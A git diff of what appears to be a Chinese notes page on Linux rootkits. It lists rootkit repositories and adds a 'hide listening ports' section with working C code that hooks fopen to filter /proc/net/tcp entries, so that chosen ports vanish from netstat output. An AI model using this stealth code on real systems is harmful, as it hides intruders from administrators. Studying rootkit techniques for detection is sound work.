@@ -102,7 +102,7 @@ var _hmt = _hmt || [];
     </ul>
   </header>
   <div class="content">
-    <h4>安装</h4>
+    <h4>介绍</h4>
 <div class="highlight"><pre><span></span><code>https://github.com/f0rb1dd3n/Reptile.git
 https://github.com/yaoyumeng/adore-ng.git
 https://github.com/citypw/suterusu.git
@@ -246,6 +246,66 @@ Hello,<span class="w"> </span>World!
 <span class="w">        </span><span class="k">break</span><span class="p">;</span><span class="w">                                                          </span>
 <span class="w">    </span><span class="o">}</span><span class="w">                                                                   </span>
 <span class="w">    </span><span class="k">return</span><span class="w"> </span>dir<span class="p">;</span><span class="w">                                                         </span>
+<span class="o">}</span>
+</code></pre></div>
+<p>监听端口隐藏</p>
+<div class="highlight"><pre><span></span><code>HOOK netstat命令相关的函数调用， 通常HOOK fopen函数来隐藏特定进程
+</code></pre></div>
+<p>这段代码重写了 fopen 函数，用于拦截对 /proc/net/tcp 和 /proc/net/tcp6 文件的读取。如果读取的是这两个文件之一，则会过滤掉需要隐藏的端口，并返回一个临时文件指针。具体步骤如下：</p>
+<ul>
+<li>使用 dlsym 获取原始 fopen 函数。</li>
+<li>打开文件并检查是否为特定路径。</li>
+<li>如果是特定路径，创建临时文件并逐行读取原文件内容。</li>
+<li>过滤掉需要隐藏的端口后写入临时文件。</li>
+<li>返回临时文件指针或原文件指针。</li>
+</ul>
+<div class="highlight"><pre><span></span><code>FILE<span class="w"> </span>*fopen<span class="o">(</span>const<span class="w"> </span>char<span class="w"> </span>*pathname,<span class="w"> </span>const<span class="w"> </span>char<span class="w"> </span>*mode<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>static<span class="w"> </span>FILE<span class="w"> </span>*<span class="o">(</span>*original_fopen<span class="o">)(</span>const<span class="w"> </span>char*,<span class="w"> </span>const<span class="w"> </span>char*<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>NULL<span class="p">;</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!original_fopen<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="nv">original_fopen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>dlsym<span class="o">(</span>RTLD_NEXT,<span class="w"> </span><span class="s2">"fopen"</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span>FILE<span class="w"> </span>*fp<span class="w"> </span><span class="o">=</span><span class="w"> </span>original_fopen<span class="o">(</span>pathname,<span class="w"> </span>mode<span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>fp<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">(</span>strcmp<span class="o">(</span>pathname,<span class="w"> </span><span class="s2">"/proc/net/tcp"</span><span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>
+<span class="w">               </span>strcmp<span class="o">(</span>pathname,<span class="w"> </span><span class="s2">"/proc/net/tcp6"</span><span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>FILE<span class="w"> </span>*tmp<span class="w"> </span><span class="o">=</span><span class="w"> </span>tmpfile<span class="o">()</span><span class="p">;</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!tmp<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span>fp<span class="p">;</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>char<span class="w"> </span>line<span class="o">[</span><span class="m">512</span><span class="o">]</span><span class="p">;</span>
+<span class="w">        </span>int<span class="w"> </span><span class="nv">first_line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">;</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>fgets<span class="o">(</span>line,<span class="w"> </span>sizeof<span class="o">(</span>line<span class="o">)</span>,<span class="w"> </span>fp<span class="o">))</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span>fputs<span class="o">(</span>line,<span class="w"> </span>tmp<span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="o">(</span>fgets<span class="o">(</span>line,<span class="w"> </span>sizeof<span class="o">(</span>line<span class="o">)</span>,<span class="w"> </span>fp<span class="o">))</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>first_line<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">                </span><span class="nv">first_line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
+<span class="w">                </span>fputs<span class="o">(</span>line,<span class="w"> </span>tmp<span class="o">)</span><span class="p">;</span>
+<span class="w">                </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">            </span><span class="o">}</span>
+
+<span class="w">            </span>char<span class="w"> </span>local_addr<span class="o">[</span><span class="m">64</span><span class="o">]</span><span class="p">;</span>
+<span class="w">            </span>unsigned<span class="w"> </span>int<span class="w"> </span>local_port<span class="p">;</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>sscanf<span class="o">(</span>line,<span class="w"> </span><span class="s2">"%*d: %[^:]:%X"</span>,<span class="w"> </span>local_addr,<span class="w"> </span><span class="p">&amp;</span>local_port<span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">2</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!should_hide_port<span class="o">(</span>local_port<span class="o">))</span><span class="w"> </span><span class="o">{</span>
+<span class="w">                    </span>fputs<span class="o">(</span>line,<span class="w"> </span>tmp<span class="o">)</span><span class="p">;</span>
+<span class="w">                </span><span class="o">}</span>
+<span class="w">            </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
+<span class="w">                </span>fputs<span class="o">(</span>line,<span class="w"> </span>tmp<span class="o">)</span><span class="p">;</span>
+<span class="w">            </span><span class="o">}</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>fclose<span class="o">(</span>fp<span class="o">)</span><span class="p">;</span>
+<span class="w">        </span>rewind<span class="o">(</span>tmp<span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span>tmp<span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>fp<span class="p">;</span>
 <span class="o">}</span>
 </code></pre></div>
 <p>防止被删除
